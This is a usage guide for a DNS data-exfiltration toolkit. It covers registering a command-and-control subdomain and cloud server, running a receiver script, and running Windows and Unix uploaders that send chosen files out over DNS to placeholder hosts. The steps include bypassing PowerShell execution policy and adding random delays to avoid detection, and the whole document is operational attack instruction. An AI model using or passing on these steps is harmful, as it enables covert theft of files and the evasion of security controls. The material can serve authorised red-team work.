DNS Exfiltration Tools

Infrastrucutre Set Up:
MUST OWN A DOMAIN AND AN INTERNET CONNECTED SERVER

AWS VM IP: 123.123.123.123
Cloudflare domain: fakedomain.com
In Cloudflare DNS managager:
  Create NS record: c2.fakedomain.com
  Create A record for c2: 123.123.123.123
  Create A records for example.com: 123.123.123.123

Tool Usage:
dns_file_receiver.py (Unix)
  Change the "domain" parameter to: c2.fakedomain.com
  Change the "SOCKET_TIMEOUT" to whatever is appropriate in seconds. This variable defines how long the script will stay active waiting for a connection from the uploaders.
  Run the script: sudo python3 dns_file_receiver.py

dns_file_uploader.ps1 (Windows)
  Change the "domain" parameter to: c2.fakedomain.com
  Run the script: powershell -ExecutionPolicy Bypass -File .\dns_file_uploader.ps1
  Follow the prompts
    File path: quotes can be used
    Domain OR IP: IP address of AWS server (123.123.123.123) or domain name (fakedomain.com)
    Set up a random delay in seconds: #

dns_file_uploader (Unix)
  Change "DNS_SERVER" parameter to: IP address of AWS server (123.123.123.123) or domain name (fakedomain.com)
  Change "domain" parameter to: c2.fakedomain.com
  Run the script: sudo python3 dns_file_uploader.py
    File path: quotes can be used
    Set up a random delay in seconds: #

ns-dns_server.py
  Optional: Change the IP in the "fake_ip" parameter
  
